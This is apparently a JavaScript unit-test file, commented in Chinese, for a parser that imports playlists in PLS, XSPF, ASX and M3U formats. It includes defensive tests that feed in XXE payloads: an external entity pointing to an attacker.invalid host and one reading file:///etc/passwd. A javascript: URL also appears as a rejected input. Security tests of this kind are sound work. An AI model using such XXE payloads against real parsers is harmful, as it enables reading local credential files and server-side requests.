// 歌单多格式导入解析测试（B4，plan-expansion-r4 §8.4）：contracts/fixtures 三黄金样本 + 自构边界样本。
// 安全断言（§13.4）：解析全程零网络——全局 fetch stub 成抛错，任何意外请求当场红（模块本就不含任何网络代码，
// stub 是回归护栏）；XXE 样本断言不抛异常、实体不展开（Node 手写扫描器路径；浏览器 DOMParser 路径天然不取外部实体）。
// Web↔Android 一致性：本文件与 android PlaylistParserTest.kt 对同批样本断言同款期望（条目集逐字段一致）。
const assert = require('assert'), fs = require('fs'), path = require('path');
const PI = require('../playlist-import.js');

// 零网络护栏：解析路径不该碰任何网络 API（stub 成抛错，意外调用立刻炸）
global.fetch = () => { throw new Error('解析器发出了网络请求！'); };

const FIX = p => fs.readFileSync(path.join(__dirname, '..', 'contracts', 'fixtures', p), 'utf8');
let pass = 0, fail = 0;
const ok = (name, fn) => { try { fn(); pass++; console.log('  ✓', name); } catch (e) { fail++; console.error('  ✗', name, '\n     ', String(e && e.message || e).split('\n')[0]); } };

ok('PLS 黄金样本：3 条、缺 Title 用 URL host、format=pls', () => {
  const r = PI.parse(FIX('playlist-pls.txt'), { format: 'playlist-pls.txt' });
  assert.strictEqual(r.format, 'pls');
  assert.strictEqual(r.length, 3);
  assert.deepStrictEqual(r[0], { name: '示例电台一', category: '自定义', url: 'https://music.example.test/live1.mp3', logo: '', externalId: '', sourceFormat: 'pls' });
  assert.strictEqual(r[1].name, 'News Radio');
  assert.strictEqual(r[2].name, 'jazz.example.test'); // File3 无 Title3 → host 兜底
  assert.strictEqual(r.invalid, 0); assert.strictEqual(r.dups, 0);
});
ok('PLS 键大小写不敏感 + NumberOfEntries 只作提示', () => {
  const r = PI.parse('NumberOfEntries=1\nFILE1=https://a.example/1\ntItLe1=台一\n', { format: 'x.pls' });
  assert.strictEqual(r.length, 1);
  assert.strictEqual(r[0].name, '台一'); // NumberOfEntries=1 恰好一致；再验错标不裁条目
  const r2 = PI.parse('NumberOfEntries=5\nFile1=https://a.example/1\n', { format: 'x.pls' });
  assert.strictEqual(r2.length, 1); // 错标 5 不产出幻影条目
});
ok('XSPF 黄金样本：相对 URL 按 baseUrl 解析、image→logo、identifier→externalId', () => {
  const r = PI.parse(FIX('playlist-xspf.xml'), { baseUrl: 'https://base.example/dir/' });
  assert.strictEqual(r.format, 'xspf');
  assert.strictEqual(r.length, 2);
  assert.strictEqual(r[0].logo, 'https://music.example.test/logo1.png');
  assert.strictEqual(r[1].url, 'https://base.example/dir/live2.aac'); // 相对 live2.aac
  assert.strictEqual(r[1].name, 'News Radio');
});
ok('XSPF 相对 URL 无 baseUrl → 计入非法桶', () => {
  const r = PI.parse(FIX('playlist-xspf.xml'));
  assert.strictEqual(r.length, 1); assert.strictEqual(r.invalid, 1);
});
ok('XSPF 命名空间不敏感（localName 判定）', () => {
  const x = '<?xml version="1.0"?><playlist xmlns="http://xspf.org/ns/0/"><trackList><track><title>台</title><location>https://a.example/1</location></track></trackList></playlist>';
  const r = PI.parse(x, { format: 'a.xspf' });
  assert.strictEqual(r.length, 1); assert.strictEqual(r[0].name, '台');
});
ok('ASX 黄金样本：ENTRY/TITLE/REF@HREF 大小写兼容、format=asx', () => {
  const r = PI.parse(FIX('playlist-asx.xml'), { format: 'list.asx' });
  assert.strictEqual(r.format, 'asx');
  assert.strictEqual(r.length, 2);
  assert.strictEqual(r[0].name, '示例电台一');
  assert.strictEqual(r[0].url, 'https://music.example.test/live1.mp3');
  const low = PI.parse('<asx version="3.0"><entry><title>小写台</title><ref href="https://low.example/x" /></entry></asx>');
  assert.strictEqual(low.format, 'asx'); assert.strictEqual(low[0].name, '小写台');
});
ok('ASX ENTRYREF 不递归下载（零网络 stub 下安全通过）', () => {
  const x = '<ASX version="3.0"><ENTRYREF HREF="https://never-fetch.example/other.asx" /><ENTRY><TITLE>本台</TITLE><REF HREF="https://a.example/1" /></ENTRY></ASX>';
  const r = PI.parse(x);
  assert.strictEqual(r.length, 1);
  assert.strictEqual(r[0].url, 'https://a.example/1'); // 只收本文件 ENTRY，ENTRYREF 指向的地址绝不入条目
  assert.ok(!r.some(e => e.url.includes('never-fetch')));
});
ok('畸形 XML：不抛异常、尽力收（无有效条目则空）', () => {
  const r1 = PI.parse('<?xml version="1.0"?><playlist><trackList><track><title>半截');
  assert.ok(Array.isArray(r1)); // 不炸即过，条目数不承诺（两端容错口径差异见报告）
  const r2 = PI.parse('<<<完全不是 xml>>>');
  assert.ok(Array.isArray(r2));
});
ok('XXE：DOCTYPE 外部实体不展开、不联网、不抛异常', () => {
  const x = '<?xml version="1.0"?><!DOCTYPE playlist [<!ENTITY xxe SYSTEM "http://attacker.invalid/x.dtd">]>'
    + '<playlist xmlns="http://xspf.org/ns/0/"><trackList><track><title>&xxe;</title><location>https://safe.example/1</location></track></trackList></playlist>';
  const r = PI.parse(x); // 全局 fetch 已 stub 成抛错——这里没红 = 没发请求
  for (const e of r) {
    assert.ok(!e.name.includes('attacker') && !e.url.includes('attacker'), '实体内容不得泄入条目');
  }
  assert.ok(r.length <= 1);
});
ok('XXE 参数实体/内部实体同样不展开（file:// 协议载荷）', () => {
  const x = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY s SYSTEM "file:///etc/passwd">]><asx><entry><title>&s;</title><ref href="https://a.example/1"/></entry></asx>';
  const r = PI.parse(x);
  assert.ok(r.length <= 1);
  for (const e of r) assert.ok(!e.name.includes('passwd'));
});
ok('文件内重复 URL 去重（dups 计数，首个胜出）', () => {
  const pls = '[playlist]\nFile1=https://a.example/1\nTitle1=甲\nFile2=https://a.example/1\nTitle2=乙\n';
  const r = PI.parse(pls);
  assert.strictEqual(r.length, 1); assert.strictEqual(r.dups, 1);
  assert.strictEqual(r[0].name, '甲');
});
ok('非 http(s) 地址剔除进非法桶', () => {
  const pls = '[playlist]\nFile1=ftp://a.example/1\nFile2=javascript:alert(1)\nFile3=https://a.example/ok\n';
  const r = PI.parse(pls);
  assert.strictEqual(r.length, 1); assert.strictEqual(r.invalid, 2);
  assert.strictEqual(r[0].url, 'https://a.example/ok');
});
ok('条目封顶 500（PLS 与纯 URL 两口径）', () => {
  const big1 = '[playlist]\n' + Array.from({ length: 600 }, (_, i) => `File${i + 1}=https://a.example/${i + 1}`).join('\n');
  assert.strictEqual(PI.parse(big1).length, 500);
  const big2 = Array.from({ length: 600 }, (_, i) => `https://a.example/${i + 1}`).join('\n');
  const r2 = PI.parse(big2);
  assert.strictEqual(r2.length, 500); assert.strictEqual(r2.format, 'url');
});
ok('纯 URL 列表：format=url、名字取 host、杂行计入非法', () => {
  const r = PI.parse('https://music.example.com/live.mp3\n\n# 注释行\n不是链接的废行\nhttp://news.example.org/stream\n');
  assert.strictEqual(r.format, 'url');
  assert.strictEqual(r.length, 2);
  assert.strictEqual(r[0].name, 'music.example.com');
  assert.strictEqual(r[1].name, 'news.example.org');
  assert.strictEqual(r.invalid, 1); // 「不是链接的废行」
});
ok('m3u 识别：EXTINF 台名/group-title 分类 + csv 行混排', () => {
  const t = '#EXTM3U\n#EXTINF:-1 group-title="爵士",台X\nhttps://a.example/1\n台Y,https://b.example/2\n';
  const r = PI.parse(t);
  assert.strictEqual(r.format, 'm3u');
  assert.strictEqual(r.length, 2);
  assert.strictEqual(r[0].name, '台X'); assert.strictEqual(r[0].category, '爵士');
  assert.strictEqual(r[1].name, '台Y'); assert.strictEqual(r[1].category, '自定义');
});
ok('显式提示优先于内容（误标 .pls 的 m3u 按 pls 解析为空）', () => {
  const r = PI.parse('#EXTM3U\n#EXTINF:-1,台\nhttps://a.example/1\n', { format: 'foo.pls' });
  assert.strictEqual(r.format, 'pls'); assert.strictEqual(r.length, 0);
});
ok('条目清洗：台名去换行/截 40 字、分类去分隔符截 24 字', () => {
  const pls = `[playlist]\nFile1=https://a.example/1\nTitle1=${'台'.repeat(60)}\nFile2=https://a.example/2\nTitle2=名\n`;
  const r = PI.parse(pls);
  assert.strictEqual(r[0].name.length, 40);
  const m = PI.parse('#EXTM3U\n#EXTINF:-1 group-title="分类,带|分隔",台\nhttps://a.example/9\n');
  assert.ok(!/[,|]/.test(m[0].category)); assert.ok(m[0].category.length <= 24);
});
ok('detect：文件头与内容特征路径', () => {
  assert.strictEqual(PI.detect('[playlist]\nFile1=x', null), 'pls');
  assert.strictEqual(PI.detect('<?xml version="1.0"?>\n<ASX version="3.0">\n<ENTRY>', null), 'asx');
  assert.strictEqual(PI.detect('<?xml version="1.0"?>\n<playlist version="1" xmlns="http://xspf.org/ns/0/">', null), 'xspf');
  assert.strictEqual(PI.detect('随便什么文本', null), 'url');
  assert.strictEqual(PI.normHint('application/xspf+xml'), 'xspf');
  assert.strictEqual(PI.normHint('audio/x-scpls'), 'pls');
  assert.strictEqual(PI.normHint('video/x-ms-asf'), 'asx');
  assert.strictEqual(PI.normHint('audio/x-mpegurl'), 'm3u');
  assert.strictEqual(PI.normHint('playlist.txt'), null);
});

console.log(`\n${pass} 通过，${fail} 失败`);
process.exit(fail ? 1 : 0);
